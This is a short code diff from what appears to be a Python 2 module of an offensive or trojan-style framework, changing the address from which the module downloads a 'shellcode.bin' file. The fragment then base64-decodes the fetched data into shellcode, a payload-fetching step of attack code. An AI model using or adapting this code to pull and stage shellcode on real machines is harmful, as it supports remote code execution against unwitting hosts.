@@ -7,7 +7,7 @@ def run(**args):
 		print "Could not load the module on this host. Skipping."
 		return 0, "failed"
 	try:
-		url = "http://localhost:8000/shellcode.bin"
+		url = "http://0.0.0.0:8000/shellcode.bin"
 		response = urllib2.urlopen(url)
 		shellcode = base64.b64decode(response.read())
 	except:
